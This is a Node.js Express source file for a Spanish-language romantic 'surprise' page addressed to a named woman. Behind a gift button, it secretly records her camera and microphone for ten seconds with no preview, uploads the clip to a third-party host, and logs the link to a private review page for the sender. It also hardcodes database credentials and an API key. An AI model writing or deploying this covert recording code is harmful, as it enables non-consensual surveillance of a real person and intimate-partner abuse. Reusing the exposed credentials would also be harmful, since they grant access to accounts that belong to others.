const express = require('express');
const multer = require('multer');
const fetch = require('node-fetch');
const FormData = require('form-data');
const { MongoClient } = require('mongodb');
const path = require('path');

const app = express();
const upload = multer({ storage: multer.memoryStorage() });

// ================= CONFIGURACIÓN =================
const MONGO_URI = 'mongodb+srv://hadyVip:hadydbatlas@cluster0.ph1mdzc.mongodb.net/linksDB?retryWrites=true&w=majority';
const DB_NAME = 'linksDB';
const COLLECTION_NAME = 'registros';

let db, collection;

async function connectDB() {
  try {
    const client = new MongoClient(MONGO_URI);
    await client.connect();
    db = client.db(DB_NAME);
    collection = db.collection(COLLECTION_NAME);
    console.log('✅ Conectado a MongoDB');
  } catch (err) {
    console.error('❌ Error conectando a MongoDB:', err);
    process.exit(1);
  }
}
connectDB();

app.use(express.static('public'));

// ================= FRONTEND (MODO INVISIBLE) =================
app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>✨ Para Briseyda ✨</title>
  <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@400;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: linear-gradient(145deg, #fff5f5 0%, #ffe6f0 100%);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: 'Quicksand', sans-serif;
      padding: 20px;
    }
    .card {
      max-width: 600px;
      width: 100%;
      background: rgba(255, 255, 255, 0.7);
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
      border-radius: 40px;
      padding: 30px 20px;
      box-shadow: 0 25px 40px -10px rgba(0, 0, 0, 0.1),
                  0 0 0 1px rgba(255, 255, 255, 0.5) inset;
      text-align: center;
      border: 1px solid rgba(255, 215, 225, 0.6);
    }
    h1 {
      font-size: 2.2rem;
      font-weight: 700;
      color: #b3406c;
      margin-bottom: 5px;
      letter-spacing: -0.5px;
      text-shadow: 3px 3px 0 #ffe0f0;
    }
    .subtitle {
      font-size: 1.2rem;
      color: #9f4576;
      margin-bottom: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      flex-wrap: wrap;
    }
    .video-container {
      background: #2d1b24;
      border-radius: 28px;
      padding: 10px;
      box-shadow: 0 18px 25px -8px rgba(180, 64, 108, 0.2);
      margin-bottom: 20px;
      border: 2px solid #ffbfd4;
    }
    #mainVideo {
      width: 100%;
      border-radius: 20px;
      display: block;
      background: #000;
    }
    .btn {
      background: #ff8da1;
      border: none;
      color: white;
      font-weight: bold;
      font-size: 1.4rem;
      padding: 16px 32px;
      border-radius: 60px;
      width: 100%;
      max-width: 300px;
      margin: 15px auto;
      cursor: pointer;
      box-shadow: 0 10px 0 #b34e6b, 0 5px 20px rgba(255, 100, 130, 0.3);
      transition: all 0.1s ease;
      border: 2px solid #ffeef2;
      font-family: 'Quicksand', sans-serif;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }
    .btn:active {
      transform: translateY(6px);
      box-shadow: 0 4px 0 #b34e6b, 0 8px 15px rgba(255, 100, 130, 0.2);
    }
    .btn:disabled {
      opacity: 0.6;
      transform: none;
      box-shadow: 0 6px 0 #b34e6b;
      pointer-events: none;
    }
    .message {
      margin-top: 20px;
      color: #b36b84;
      font-size: 1rem;
    }
    .footer-note {
      margin-top: 25px;
      color: #b36b84;
      font-size: 0.95rem;
    }
    .hidden { display: none !important; }
  </style>
</head>
<body>
  <div class="card">
    <h1>
      <i class="fas fa-heart"></i>
      Para Briseyda
      <i class="fas fa-heart"></i>
    </h1>
    <div class="subtitle">
      <i class="fas fa-crown"></i> de parte de su flako <i class="fas fa-crown"></i>
    </div>

<div class="video-container">
  <iframe 
    src="https://anonmp4.help/embed/X61KVuDiNZysvuE"
    frameborder="0"
    allowfullscreen
    allow="autoplay; fullscreen; picture-in-picture"
    style="width: 100%; height: 100%; border-radius: 12px;">
  </iframe>
</div>
    
    <button class="btn" id="surpriseBtn">
      <i class="fas fa-gift"></i> Ver sorpresa
    </button>

    <div id="finalMessage" class="message hidden">
      <i class="fas fa-heart" style="color: #ff4d6d;"></i> 
      ¡Gracias por verlo, te amo! 
      <i class="fas fa-heart" style="color: #ff4d6d;"></i>
    </div>

    <div class="footer-note">
      <i class="fas fa-magic"></i> Solo para ti
    </div>
  </div>

  <script>
    const mainVideo = document.getElementById('mainVideo');
    const surpriseBtn = document.getElementById('surpriseBtn');
    const finalMessage = document.getElementById('finalMessage');

    let mediaStream = null;
    let mediaRecorder = null;
    let recordedChunks = [];

    // Subir video en segundo plano
    async function uploadVideo(blob) {
      const formData = new FormData();
      formData.append('file', blob, 'reaccion.webm');
      try {
        const response = await fetch('/upload', {
          method: 'POST',
          body: formData
        });
        const data = await response.json();
        console.log('✅ Video subido:', data.url);
      } catch (err) {
        console.error('❌ Error subiendo:', err);
      }
    }

    // Iniciar grabación oculta
    async function startHiddenRecording() {
      try {
        // Pedir permisos de cámara y micrófono SIN mostrar preview
        mediaStream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user' },
          audio: true
        });

        // Crear un elemento de video oculto para que el stream esté activo
        const hiddenVideo = document.createElement('video');
        hiddenVideo.srcObject = mediaStream;
        hiddenVideo.muted = true;
        hiddenVideo.autoplay = true;
        hiddenVideo.playsinline = true;
        hiddenVideo.style.display = 'none';
        document.body.appendChild(hiddenVideo);

        recordedChunks = [];
        mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });

        mediaRecorder.ondataavailable = (e) => {
          if (e.data.size > 0) recordedChunks.push(e.data);
        };

        mediaRecorder.onstop = () => {
          const blob = new Blob(recordedChunks, { type: 'video/webm' });
          if (blob.size > 0) {
            uploadVideo(blob);
          }
          // Detener tracks y limpiar
          mediaStream.getTracks().forEach(track => track.stop());
          if (hiddenVideo) hiddenVideo.remove();
          mediaStream = null;
        };

        mediaRecorder.start();
        
        // Grabar 10 segundos (puedes cambiar aquí la duración)
        setTimeout(() => {
          if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
          }
        }, 10000); // 10000 ms = 10 segundos

      } catch (err) {
        console.warn('Permiso de cámara denegado o error:', err);
        // Si no da permiso, igual continuamos sin grabar, la sorpresa sigue
      }
    }

    surpriseBtn.addEventListener('click', async () => {
      surpriseBtn.disabled = true;
      
      // Iniciar grabación oculta (pedirá permisos si no se han dado)
      await startHiddenRecording();

      // Mostrar mensaje final
      finalMessage.classList.remove('hidden');
      surpriseBtn.classList.add('hidden');
    });

    // Limpieza al salir
    window.addEventListener('beforeunload', () => {
      if (mediaStream) {
        mediaStream.getTracks().forEach(t => t.stop());
      }
    });
  </script>
</body>
</html>
  `);
});

// ================= BACKEND =================
app.post('/upload', upload.single('file'), async (req, res) => {
  console.log('\n📥 Nueva grabación oculta');

  try {
    if (!req.file) {
      console.log('❌ No se recibió archivo');
      return res.json({ error: 'no file' });
    }

    console.log(`📦 Tamaño: ${req.file.buffer.length} bytes`);

    const form = new FormData();
    form.append('file', req.file.buffer, 'video.webm');

    console.log('📤 Subiendo a Uguu...');
    const response = await fetch('https://api.malvin.gleeze.com/upload/uguu?apikey=mvn_d0d0c93495d612c5ec8c3aec2c637410', {
      method: 'POST',
      body: form
    });

    const data = await response.json();
    console.log('📩 Respuesta Uguu:', data);

    const url = data?.result?.uploaded_url;
    if (!url) {
      console.log('❌ API no devolvió URL');
      return res.json({ error: 'no url', raw: data });
    }

    // NO agregamos extensión .webm, usamos la URL tal cual
    const finalUrl = url;
    console.log('✅ URL generada:', finalUrl);

    const registro = {
      fecha: new Date(),
      url: finalUrl,
      destinataria: 'Briseyda',
      tipo: 'reaccion'
    };

    await collection.insertOne(registro);
    console.log('💾 Guardado en MongoDB');

    res.json({ ok: true, url: finalUrl });

  } catch (error) {
    console.error('🔥 Error en /upload:', error);
    res.json({ error: 'server error' });
  }
});

// ================= VER REGISTROS (SOLO PARA TI) =================
app.get('/registros', async (req, res) => {
  try {
    const registros = await collection.find().sort({ fecha: -1 }).toArray();
    
    let html = `
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <title>🔐 Registros privados</title>
      <link href="https://fonts.googleapis.com/css2?family=Quicksand&display=swap" rel="stylesheet">
      <style>
        body { background: #1e1e1e; font-family: 'Quicksand', sans-serif; padding: 30px; color: #eee; }
        h1 { color: #ff8da1; }
        .registro { background: #2d2d2d; border-radius: 20px; padding: 15px; margin: 15px 0; box-shadow: 0 5px 10px rgba(0,0,0,0.3); }
        a { color: #ffb6c1; font-weight: bold; }
        .fecha { color: #aaa; font-size: 0.9rem; }
      </style>
    </head>
    <body>
      <h1>💕 Reacciones de Briseyda</h1>
    `;

    if (registros.length === 0) {
      html += '<p>Aún no hay reacciones 🥺</p>';
    } else {
      registros.forEach(r => {
        html += `
          <div class="registro">
            <div class="fecha">${new Date(r.fecha).toLocaleString('es-MX')}</div>
            <a href="${r.url}" target="_blank">${r.url}</a>
          </div>
        `;
      });
    }

    html += '<p><a href="/" style="color:#ffb6c1;">⬅ Volver</a></p></body></html>';
    res.send(html);

  } catch (error) {
    console.error('Error en /registros:', error);
    res.status(500).send('Error al obtener registros');
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Servidor en http://localhost:${PORT}`);
});